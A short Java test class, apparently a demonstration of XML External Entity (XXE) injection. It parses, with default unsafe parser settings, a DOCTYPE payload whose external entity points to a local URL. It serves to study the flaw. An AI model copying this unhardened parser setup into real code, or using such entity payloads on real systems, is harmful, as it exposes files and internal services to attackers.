package XXE;

import org.w3c.dom.Document;
import org.xml.sax.SAXException;
import javax.xml.parsers.*;
import java.io.ByteArrayInputStream;
import java.io.InputStream;

public class DomTest {
    public static void main(String[] args)throws ParserConfigurationException,SAXException,Exception{
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        String str = "<!DOCTYPE doc [ \n" +
                "<!ENTITY xxe SYSTEM \"http://127.0.0.1:1664\">\n" +
                "]><doc>&xxe;</doc>";
        InputStream is = new ByteArrayInputStream(str.getBytes());
        Document doc = db.parse(is);
    }
}